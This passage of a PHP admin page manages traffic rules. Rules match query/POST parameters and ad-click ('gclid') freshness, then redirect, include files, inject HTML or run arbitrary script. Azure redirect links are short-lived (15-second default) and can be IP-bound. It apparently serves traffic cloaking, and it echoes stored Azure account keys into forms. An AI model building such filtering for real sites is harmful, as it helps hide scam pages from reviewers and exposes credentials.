              <label class="form-label">TTL (seconds)</label>
              <input type="number" min="1" class="form-control" name="az_ttl" placeholder="15" value="15">
            </div>
            <div class="col-md-6">
              <label class="form-label">IP lock</label>
              <div class="form-check">
                <input class="form-check-input" type="checkbox" name="az_lockip" id="az_lockip">
                <label class="form-check-label" for="az_lockip">Bind SAS to client IP</label>
              </div>
            </div>
          </div>
          <div class="form-text mt-1">This stores config in the rule; the actual SAS URL is computed at runtime on the server.</div>
        </div>
      </div>
    `;
        }

        function renderActionFields() {
          const t = actSel.value; let html = '';
          if (t === 'server-301-redirect' || t === 'server-302-redirect' || t === 'js-redirect') {
            html = azureFieldsTemplate();
          } else if (t === 'server-include') {
            html = `<label class="form-label">Include file (relative)</label><input class="form-control" name="action_file" placeholder="snippet.php">`;
          } else if (t === 'server-echo-data') {
            html = `<label class="form-label">Echo text</label><textarea class="form-control" rows="3" name="action_text"></textarea>`;
          } else if (t === 'js-includehtml') {
            html = `<label class="form-label">HTML to inject</label><textarea class="form-control" rows="3" name="action_html"></textarea>
              <label class="form-label mt-2">Optional script</label><textarea class="form-control" rows="3" name="action_script" placeholder="console.log('hi')"></textarea>`;
          } else if (t === 'js-exec') {
            html = `<label class="form-label">Script to run</label><textarea class="form-control" rows="4" name="action_script" placeholder="alert('Hello')"></textarea>`;
          }
          actBox.innerHTML = html;

          // Prefill existing action data (PHP inject below)
          <?php if (is_array($a)):
            $ad = $a['data'] ?? [];
            $az = $ad['azure'] ?? []; ?>
              (function () {
                const t = <?= json_encode($a['type'] ?? '') ?>;
                if (t === 'server-include') document.querySelector('[name="action_file"]').value = <?= json_encode($ad['file'] ?? '') ?>;
                if (t === 'server-echo-data') document.querySelector('[name="action_text"]').value = <?= json_encode($ad['text'] ?? '') ?>;
                if (t === 'js-includehtml') { document.querySelector('[name="action_html"]').value = <?= json_encode($ad['html'] ?? '') ?>; const s = document.querySelector('[name="action_script"]'); if (s) s.value = <?= json_encode($ad['script'] ?? '') ?>; }
                if (t === 'js-exec') { const s = document.querySelector('[name="action_script"]'); if (s) s.value = <?= json_encode($ad['script'] ?? '') ?>; }
                if (t === 'server-301-redirect' || t === 'server-302-redirect' || t === 'js-redirect') {
                  const mode = <?= json_encode($existing_mode) ?>;
                  const sel = document.getElementById('redir_mode'); if (sel) sel.value = mode;
                  const rawWrap = document.getElementById('rawUrlWrap');
                  const azWrap = document.getElementById('azWrap');
                  const toggle = () => { if (sel.value === 'azure') { azWrap.style.display = 'block'; rawWrap.style.display = 'none'; } else { azWrap.style.display = 'none'; rawWrap.style.display = 'block'; } };
                  if (sel) { sel.addEventListener('change', toggle); toggle(); }
                  const raw = <?= json_encode($ad['url'] ?? '') ?>;
                  const az = <?= json_encode($az) ?>;
                  const rawInput = document.querySelector('[name="action_url"]'); if (rawInput) rawInput.value = raw || '';
                  if (az && azWrap) {
                    const set = (n, v) => { const el = document.querySelector('[name="' + n + '"]'); if (el) { el.value = (v ?? ''); } };
                    set('az_account', az.accountName ?? '');
                    set('az_key', az.accountKeyB64 ?? '');
                    set('az_domain', az.customDomain ?? '');
                    set('az_container', az.container ?? '$web');
                    set('az_blob', az.entryBlob ?? 'index.html');
                    set('az_sv', az.sv ?? '2022-11-02');
                    set('az_ttl', String(az.ttlSeconds ?? 15));
                    const cb = document.getElementById('az_lockip'); if (cb) cb.checked = !!(Number(az.lockByIP ?? 0));
                  }
                }
              })();
          <?php endif; ?>
        }
        actSel.addEventListener('change', renderActionFields); renderActionFields();

        document.getElementById('ruleForm').addEventListener('submit', () => {
          const chosen = Array.from(document.querySelectorAll('.crit:checked')).map(x => x.value);
          const extra = document.getElementById('crit_extra').value.trim();
          if (extra) chosen.push(...extra.split(',').map(s => s.trim()).filter(Boolean));
          document.getElementById('criteria_all').value = chosen.join(',');
        });

        // Query params rows
        const qpRows = document.getElementById('qp_rows');
        document.getElementById('qp_add').onclick = () => {
          const row = document.createElement('div'); row.className = 'input-group mb-2';
          row.innerHTML = `<span class="input-group-text">name</span>
      <input class="form-control" name="qp_name[]" list="listQPNames">
      <select class="form-select" name="qp_op[]">
        <option value="eq">=</option><option value="neq">≠</option>
        <option value="contains">contains</option><option value="not_contains">does not contain</option>
        <option value="in">in</option><option value="not_in">not in</option>
        <option value="gt">&gt;</option><option value="lt">&lt;</option>
        <option value="gte">≥</option><option value="lte">≤</option>
        <option value="between">between</option>
        <option value="empty">empty</option><option value="not_empty">not empty</option>
        <option value="regex">regex</option>
      </select>

      <input class="form-control" name="qp_value[]" placeholder="value or CSV">
      <button class="btn btn-outline-danger" type="button">&times;</button>`;
          row.querySelector('button').onclick = () => row.remove(); qpRows.appendChild(row);
        };
        <?php if (is_array($r) && isset($r['conditions']['query_params']) && is_array($r['conditions']['query_params'])):
          foreach ($r['conditions']['query_params'] as $qn => $qv):
            [$qop, $qval] = cond_to_pair($qv); ?>
            document.getElementById('qp_add').click(); (function () { const g = qpRows.lastElementChild; g.querySelector('[name="qp_name[]"]').value = <?= json_encode($qn) ?>; g.querySelector('[name="qp_op[]"]').value = <?= json_encode($qop) ?>; g.querySelector('[name="qp_value[]"]').value = <?= json_encode($qval) ?>; })();
          <?php endforeach; endif; ?>

        // POST params rows
        const ppRows = document.getElementById('pp_rows');
        document.getElementById('pp_add').onclick = () => {
          const row = document.createElement('div'); row.className = 'input-group mb-2';
          row.innerHTML = `<span class="input-group-text">name</span>
      <input class="form-control" name="pp_name[]" list="listQPNames">
      <select class="form-select" name="pp_op[]">
         <option value="eq">=</option><option value="neq">≠</option>
        <option value="contains">contains</option><option value="not_contains">does not contain</option>
        <option value="in">in</option><option value="not_in">not in</option>
        <option value="gt">&gt;</option><option value="lt">&lt;</option>
        <option value="gte">≥</option><option value="lte">≤</option>
        <option value="between">between</option>
        <option value="empty">empty</option><option value="not_empty">not empty</option>
        <option value="regex">regex</option>
      </select>
      <input class="form-control" name="pp_value[]" placeholder="value or CSV">
      <button class="btn btn-outline-danger" type="button">&times;</button>`;
          row.querySelector('button').onclick = () => row.remove(); ppRows.appendChild(row);
        };
        <?php if (is_array($r) && isset($r['conditions']['post_params']) && is_array($r['conditions']['post_params'])):
          foreach ($r['conditions']['post_params'] as $pn => $pv):
            [$pop, $pval] = cond_to_pair($pv); ?>
            document.getElementById('pp_add').click(); (function () { const g = ppRows.lastElementChild; g.querySelector('[name="pp_name[]"]').value = <?= json_encode($pn) ?>; g.querySelector('[name="pp_op[]"]').value = <?= json_encode($pop) ?>; g.querySelector('[name="pp_value[]"]').value = <?= json_encode($pval) ?>; })();
          <?php endforeach; endif; ?>
      </script>

    <?php else: ?>
      <div class="card">
        <div class="card-header d-flex justify-content-between">
          <span>All Rules</span><a href="?a=new" class="btn btn-sm btn-primary">+ New Rule</a>
        </div>
        <div class="card-body p-0">
          <div class="table-responsive">
            <table class="table table-striped table-hover align-middle mb-0">
              <thead>
                <tr>
                  <th>ID</th>
                  <th>Priority</th>
                  <th>Conditions</th>
                  <th>Criteria</th>
                  <th>Action</th>
                  <th>Updated On</th>
                  <th></th>
                </tr>
              </thead>
              <tbody>
                <?php foreach ($settings as $s):
                  if (!is_array($s))
                    continue;
                  $conds = is_array($s['conditions'] ?? null) ? $s['conditions'] : [];
                  $crit = $s['criteria'] ?? [];
                  if (!is_array($crit))
                    $crit = array_filter(array_map('trim', explode(',', (string) $crit)));
                  $action = is_array($s['action'] ?? null) ? $s['action'] : ['type' => '', 'data' => []];
                  ?>
                  <tr>
                    <td><code><?= h($s['id'] ?? '') ?></code></td>
                    <td>
                      <span class="badge bg-secondary">
                        <?= h($s['priority'] ?? 100) ?>
                      </span>
                    </td>

                    <td class="small">
                      <?php if (!$conds): ?><span class="text-muted">—</span>
                      <?php else: ?>
                        <div class="d-flex flex-wrap gap-1">
                          <?php foreach ($conds as $k => $v):
                            if ($k === 'query_params' && is_array($v)) {
                              foreach ($v as $qn => $qv) {
                                [$op, $val] = cond_to_pair($qv); ?>
                                <span class="badge text-bg-info">q.<?= h($qn) ?> <small><?= h($op) ?> →
                                    <?= h($val) ?></small></span>
                              <?php }
                              continue;
                            }
                            if ($k === 'post_params' && is_array($v)) {
                              foreach ($v as $pn => $pv) {
                                [$op, $val] = cond_to_pair($pv); ?>
                                <span class="badge text-bg-warning">p.<?= h($pn) ?> <small><?= h($op) ?> →
                                    <?= h($val) ?></small></span>
                              <?php }
                              continue;
                            }
                            if ($k === 'gclid_fresh' && is_array($v)) { ?>
                              <span class="badge text-bg-success">gclid_fresh
                                <small>param=<?= h($v['param'] ?? '') ?> ≤ <?= h((string) ($v['seconds'] ?? '')) ?>s</small>
                              </span>
                              <?php continue;
                            }
                            [$op, $val] = cond_to_pair($v); ?>
                            <span class="badge text-bg-secondary"><?= h($k) ?> <small><?= h($op) ?> →
                                <?= h($val) ?></small></span>
                          <?php endforeach; ?>
                        </div><?php endif; ?>
                    </td>
                    <td>
                      <?php if (!$crit): ?><span class="text-muted">—</span>
                      <?php else:
                        foreach ($crit as $ci): ?><span class="badge text-bg-secondary"><?= h($ci) ?></span>
                        <?php endforeach; endif; ?>
                    </td>
                    <td class="text-break">
                      <div><span class="badge text-bg-primary"><?= h($action['type'] ?? '') ?></span></div>
                      <small class="text-muted"><?= h(json_encode($action['data'] ?? [], JSON_UNESCAPED_SLASHES)) ?></small>
                    </td>
                    <td>
                      <small><?= !empty($s['updated_on']) ? date('Y-m-d H:i:s', strtotime($s['updated_on'])) : '' ?></small>
                    </td>
                    <td>
                      <div class="btn-group">
                        <a class="btn btn-sm btn-outline-primary" href="?a=edit&id=<?= h($s['id'] ?? '') ?>">Edit</a>
                        <a class="btn btn-sm btn-outline-info" href="?a=clone&id=<?= h($s['id'] ?? '') ?>">Clone</a>
                        <a class="btn btn-sm btn-outline-danger" href="?a=delete&id=<?= h($s['id'] ?? '') ?>"
                          onclick="return confirm('Delete rule?')">Delete</a>
                      </div>
                    </td>
                  </tr>
                <?php endforeach;
                if (empty($settings)): ?>
                  <tr>
                    <td colspan="6" class="text-center text-muted p-4">No rules yet. Click <b>+ New Rule</b> to create one.
                    </td>
                  </tr>
                <?php endif; ?>
              </tbody>
            </table>
          </div>
        </div>
      </div>
    <?php endif; ?>
  </div>
  <script src="https://cdn.jsdelivr.net/npm/bootstrap@5.3.3/dist/js/bootstrap.bundle.min.js"></script>
</body>

</html>